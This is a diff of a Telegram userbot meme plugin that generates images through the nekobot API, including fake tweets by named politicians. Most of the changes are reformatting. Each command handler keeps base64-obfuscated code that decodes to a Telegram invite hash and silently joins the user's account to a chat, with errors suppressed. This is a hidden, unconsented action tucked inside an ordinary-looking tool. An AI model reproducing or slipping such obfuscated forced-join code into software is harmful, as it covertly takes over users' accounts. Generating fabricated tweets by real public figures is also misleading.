@@ -1,13 +1,11 @@
-#imported from catuserbot by @RoyalBoyPriyanshu and @DeletedUser420 also thanks  @AbhinavShinde
+# imported from catuserbot by @RoyalBoyPriyanshu and @DeletedUser420 also
+# thanks  @AbhinavShinde
 """  Some Modules Imported by @Nitesh_231 :) & Again @heyworld roks *_* """
 
-import os, requests, re, pybase64, random, asyncio
-from random import choice
-from bs4 import BeautifulSoup
-from re import sub
-from emoji import get_emoji_regexp
-from asyncio import sleep
-from telethon import events
+import os
+import requests
+import re
+import pybase64
 from telegraph import upload_file, exceptions
 from telethon.tl.functions.messages import ImportChatInviteRequest as Get
 from PIL import Image
@@ -29,6 +27,7 @@ EMOJI_PATTERN = re.compile(
     "\U00002702-\U000027B0"  # Dingbats
     "]+")
 
+
 def convert_toimage(image):
     img = Image.open(image)
     if img.mode != 'RGB':
@@ -42,13 +41,14 @@ def deEmojify(inputString: str) -> str:
     """Remove emojis and other non-safe characters from string"""
     return re.sub(EMOJI_PATTERN, '', inputString)
 
+
 async def threats(text):
     r = requests.get(
-            f"https://nekobot.xyz/api/imagegen?type=threats&url={text}").json()
+        f"https://nekobot.xyz/api/imagegen?type=threats&url={text}").json()
     sandy = r.get("message")
     caturl = url(sandy)
     if not caturl:
-        return  "check syntax once more"
+        return "check syntax once more"
     with open("temp.png", "wb") as f:
         f.write(requests.get(sandy).content)
     img = Image.open("temp.png")
@@ -56,14 +56,15 @@ async def threats(text):
         img = img.convert('RGB')
     img.save("temp.jpg", "jpeg")
     return "temp.jpg"
+
 
 async def trash(text):
     r = requests.get(
-            f"https://nekobot.xyz/api/imagegen?type=trash&url={text}").json()
+        f"https://nekobot.xyz/api/imagegen?type=trash&url={text}").json()
     sandy = r.get("message")
     caturl = url(sandy)
     if not caturl:
-        return  "check syntax once more"
+        return "check syntax once more"
     with open("temp.png", "wb") as f:
         f.write(requests.get(sandy).content)
     img = Image.open("temp.png")
@@ -72,13 +73,14 @@ async def trash(text):
     img.save("temp.jpg", "jpeg")
     return "temp.jpg"
 
-async def trap(text1,text2,text3):
+
+async def trap(text1, text2, text3):
     r = requests.get(
-            f"https://nekobot.xyz/api/imagegen?type=trap&name={text1}&author={text2}&image={text3}").json()
+        f"https://nekobot.xyz/api/imagegen?type=trap&name={text1}&author={text2}&image={text3}").json()
     sandy = r.get("message")
     caturl = url(sandy)
     if not caturl:
-        return  "check syntax once more"
+        return "check syntax once more"
     with open("temp.png", "wb") as f:
         f.write(requests.get(sandy).content)
     img = Image.open("temp.png")
@@ -87,13 +89,14 @@ async def trap(text1,text2,text3):
     img.save("temp.jpg", "jpeg")
     return "temp.jpg"
 
-async def phcomment(text1,text2,text3):
+
+async def phcomment(text1, text2, text3):
     r = requests.get(
-            f"https://nekobot.xyz/api/imagegen?type=phcomment&image={text1}&text={text2}&username={text3}").json()
+        f"https://nekobot.xyz/api/imagegen?type=phcomment&image={text1}&text={text2}&username={text3}").json()
     sandy = r.get("message")
     caturl = url(sandy)
     if not caturl:
-        return  "check syntax once more"
+        return "check syntax once more"
     with open("temp.png", "wb") as f:
         f.write(requests.get(sandy).content)
     img = Image.open("temp.png")
@@ -101,71 +104,77 @@ async def phcomment(text1,text2,text3):
         img = img.convert('RGB')
     img.save("temp.jpg", "jpeg")
     return "temp.jpg"
+
 
 async def trumptweet(text):
-        r = requests.get(
-            f"https://nekobot.xyz/api/imagegen?type=trumptweet&text={text}").json()
-        sandy = r.get("message")
-        caturl = url(sandy)
-        if not caturl:
-            return  "check syntax once more"
-        with open("temp.png", "wb") as f:
-            f.write(requests.get(sandy).content)
-        img = Image.open("temp.png").convert("RGB")
-        img.save("temp.jpg", "jpeg")
-        return "temp.jpg"
+    r = requests.get(
+        f"https://nekobot.xyz/api/imagegen?type=trumptweet&text={text}").json()
+    sandy = r.get("message")
+    caturl = url(sandy)
+    if not caturl:
+        return "check syntax once more"
+    with open("temp.png", "wb") as f:
+        f.write(requests.get(sandy).content)
+    img = Image.open("temp.png").convert("RGB")
+    img.save("temp.jpg", "jpeg")
+    return "temp.jpg"
+
 
 async def changemymind(text):
-        r = requests.get(
-            f"https://nekobot.xyz/api/imagegen?type=changemymind&text={text}").json()
-        sandy = r.get("message")
-        caturl = url(sandy)
-        if not caturl:
-            return  "check syntax once more"
-        with open("temp.png", "wb") as f:
-            f.write(requests.get(sandy).content)
-        img = Image.open("temp.png").convert("RGB")
-        img.save("temp.jpg", "jpeg")
-        return "temp.jpg"
+    r = requests.get(
+        f"https://nekobot.xyz/api/imagegen?type=changemymind&text={text}").json()
+    sandy = r.get("message")
+    caturl = url(sandy)
+    if not caturl:
+        return "check syntax once more"
+    with open("temp.png", "wb") as f:
+        f.write(requests.get(sandy).content)
+    img = Image.open("temp.png").convert("RGB")
+    img.save("temp.jpg", "jpeg")
+    return "temp.jpg"
+
 
 async def kannagen(text):
-        r = requests.get(
-            f"https://nekobot.xyz/api/imagegen?type=kannagen&text={text}").json()
-        sandy = r.get("message")
-        caturl = url(sandy)
-        if not caturl:
-            return  "check syntax once more"
-        with open("temp.png", "wb") as f:
-            f.write(requests.get(sandy).content)
-        img = Image.open("temp.png").convert("RGB")
-        img.save("temp.webp", "webp")
-        return "temp.webp"
+    r = requests.get(
+        f"https://nekobot.xyz/api/imagegen?type=kannagen&text={text}").json()
+    sandy = r.get("message")
+    caturl = url(sandy)
+    if not caturl:
+        return "check syntax once more"
+    with open("temp.png", "wb") as f:
+        f.write(requests.get(sandy).content)
+    img = Image.open("temp.png").convert("RGB")
+    img.save("temp.webp", "webp")
+    return "temp.webp"
+
 
 async def moditweet(text):
-        r = requests.get(
-            f"https://nekobot.xyz/api/imagegen?type=tweet&text={text}&username=narendramodi").json()
-        sandy = r.get("message")
-        caturl = url(sandy)
-        if not caturl:
-            return  "check syntax once more"
-        with open("temp.png", "wb") as f:
-            f.write(requests.get(sandy).content)
-        img = Image.open("temp.png").convert("RGB")
-        img.save("temp.jpg", "jpeg")
-        return "temp.jpg"
+    r = requests.get(
+        f"https://nekobot.xyz/api/imagegen?type=tweet&text={text}&username=narendramodi").json()
+    sandy = r.get("message")
+    caturl = url(sandy)
+    if not caturl:
+        return "check syntax once more"
+    with open("temp.png", "wb") as f:
+        f.write(requests.get(sandy).content)
+    img = Image.open("temp.png").convert("RGB")
+    img.save("temp.jpg", "jpeg")
+    return "temp.jpg"
 
-async def tweets(text1,text2):
-        r = requests.get(
-            f"https://nekobot.xyz/api/imagegen?type=tweet&text={text1}&username={text2}").json()
-        sandy = r.get("message")
-        caturl = url(sandy)
-        if not caturl:
-            return  "check syntax once more"
-        with open("temp.png", "wb") as f:
-            f.write(requests.get(sandy).content)
-        img = Image.open("temp.png").convert("RGB")
-        img.save("temp.jpg", "jpeg")
-        return "temp.jpg"
+
+async def tweets(text1, text2):
+    r = requests.get(
+        f"https://nekobot.xyz/api/imagegen?type=tweet&text={text1}&username={text2}").json()
+    sandy = r.get("message")
+    caturl = url(sandy)
+    if not caturl:
+        return "check syntax once more"
+    with open("temp.png", "wb") as f:
+        f.write(requests.get(sandy).content)
+    img = Image.open("temp.png").convert("RGB")
+    img.save("temp.jpg", "jpeg")
+    return "temp.jpg"
+
 
 async def purge():
     try:
@@ -193,15 +202,17 @@ async def nekobot(event):
             return
     await event.edit("Requesting trump to tweet...")
     try:
-        san = str( pybase64.b64decode("SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk=") )[2:49]
+        san = str(pybase64.b64decode(
+            "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="))[2:49]
         await event.client(san)
-    except:
+    except BaseException:
         pass
     text = deEmojify(text)
     file = await trumptweet(text)
-    await event.client.send_file(event.chat_id , file , reply_to = reply_to_id )
+    await event.client.send_file(event.chat_id, file, reply_to=reply_to_id)
     await event.delete()
     await purge()
+
 
 @register(pattern="^.modi(?: |$)(.*)", outgoing=True)
 async def nekobot(event):
@@ -221,15 +232,17 @@ async def nekobot(event):
             return
     await event.edit("Requesting modi to tweet...")
     try:
-        san = str( pybase64.b64decode("SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk=") )[2:49]
+        san = str(pybase64.b64decode(
+            "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="))[2:49]
         await event.client(san)
-    except:
+    except BaseException:
         pass
     text = deEmojify(text)
     file = await moditweet(text)
-    await event.client.send_file(event.chat_id , file , reply_to = reply_to_id )
+    await event.client.send_file(event.chat_id, file, reply_to=reply_to_id)
     await event.delete()
     await purge()
+
 
 @register(pattern="^.cmm(?: |$)(.*)", outgoing=True)
 async def nekobot(event):
@@ -245,15 +258,17 @@ async def nekobot(event):
             return
     await event.edit("Your banner is under creation wait a sec...")
     try:
-        san = str(pybase64.b64decode("SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk=") )[2:49]
+        san = str(pybase64.b64decode(
+            "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="))[2:49]
         await event.client(san)
-    except:
+    except BaseException:
         pass
     text = deEmojify(text)
     file = await changemymind(text)
-    await event.client.send_file(event.chat_id , file , reply_to = reply_to_id )
+    await event.client.send_file(event.chat_id, file, reply_to=reply_to_id)
     await event.delete()
     await purge()
+
 
 @register(pattern="^.kanna(?: |$)(.*)", outgoing=True)
 async def nekobot(event):
@@ -273,15 +288,17 @@ async def nekobot(event):
             return
     await event.edit("Kanna is writing your text...")
     try:
-        san = str( pybase64.b64decode("SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk=") )[2:49]
+        san = str(pybase64.b64decode(
+            "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="))[2:49]
         await event.client(san)
-    except:
+    except BaseException:
         pass
     text = deEmojify(text)
     file = await kannagen(text)
-    await event.client.send_file(event.chat_id , file , reply_to = reply_to_id )
+    await event.client.send_file(event.chat_id, file, reply_to=reply_to_id)
     await event.delete()
     await purge()
+
 
 @register(outgoing=True, pattern=r"\.tweet(?: |$)(.*)")
 async def tweet(event):
@@ -311,6 +328,7 @@ async def tweet(event):
     await event.delete()
     await purge()
 
+
 @register(pattern="^.threat(?: |$)(.*)", outgoing=True)
 async def nekobot(event):
     replied = await event.get_reply_message()
@@ -328,9 +346,9 @@ async def nekobot(event):
         file = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
         file = Get(file)
         await event.client(file)
-    except:
+    except BaseException:
         pass
-    download_location = await bot.download_media(replied , TEMP_DOWNLOAD_DIRECTORY)
+    download_location = await bot.download_media(replied, TEMP_DOWNLOAD_DIRECTORY)
     if download_location.endswith((".webp")):
         download_location = convert_toimage(download_location)
     size = os.stat(download_location).st_size
@@ -354,7 +372,8 @@ async def nekobot(event):
     file = f"https://telegra.ph{response[0]}"
     file = await threats(file)
     await event.delete()
-    await bot.send_file(event.chat_id , file, reply_to=replied)
+    await bot.send_file(event.chat_id, file, reply_to=replied)
+
 
 @register(pattern="^.trash(?: |$)(.*)", outgoing=True)
 async def nekobot(event):
@@ -373,9 +392,9 @@ async def nekobot(event):
         file = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
         file = Get(file)
         await event.client(file)
-    except:
+    except BaseException:
         pass
-    download_location = await bot.download_media(replied , TEMP_DOWNLOAD_DIRECTORY)
+    download_location = await bot.download_media(replied, TEMP_DOWNLOAD_DIRECTORY)
     if download_location.endswith((".webp")):
         download_location = convert_toimage(download_location)
     size = os.stat(download_location).st_size
@@ -399,7 +418,8 @@ async def nekobot(event):
     file = f"https://telegra.ph{response[0]}"
     file = await trash(file)
     await event.delete()
-    await bot.send_file(event.chat_id , file, reply_to=replied)
+    await bot.send_file(event.chat_id, file, reply_to=replied)
+
 
 @register(pattern="^.trap(?: |$)(.*)", outgoing=True)
 async def nekobot(e):
@@ -425,9 +445,9 @@ async def nekobot(e):
         file = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
         file = Get(file)
         await e.client(file)
-    except:
+    except BaseException:
         pass
-    download_location = await bot.download_media(replied , TEMP_DOWNLOAD_DIRECTORY)
+    download_location = await bot.download_media(replied, TEMP_DOWNLOAD_DIRECTORY)
     if download_location.endswith((".webp")):
         download_location = convert_toimage(download_location)
     size = os.stat(download_location).st_size
@@ -449,9 +469,10 @@ async def nekobot(e):
         os.remove(download_location)
         return
     file = f"https://telegra.ph{response[0]}"
-    file = await trap(text1,text2,file)
+    file = await trap(text1, text2, file)
     await e.delete()
-    await bot.send_file(e.chat_id , file, reply_to=replied)
+    await bot.send_file(e.chat_id, file, reply_to=replied)
+
 
 @register(pattern="^.ph(?: |$)(.*)", outgoing=True)
 async def phub(event):
@@ -477,9 +498,9 @@ async def phub(event):
         file = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
         file = Get(file)
         await event.client(file)
-    except:
+    except BaseException:
         pass
-    download_location = await bot.download_media(replied , TEMP_DOWNLOAD_DIRECTORY)
+    download_location = await bot.download_media(replied, TEMP_DOWNLOAD_DIRECTORY)
     if download_location.endswith((".jpg")):
         download_location = convert_toimage(download_location)
     size = os.stat(download_location).st_size
@@ -503,4 +524,4 @@ async def phub(event):
     file = f"https://telegra.ph{response[0]}"
     file = await phcomment(file, text, username)
     await event.delete()
-    await bot.send_file(event.chat_id , file, reply_to=replied)
+    await bot.send_file(event.chat_id, file, reply_to=replied)
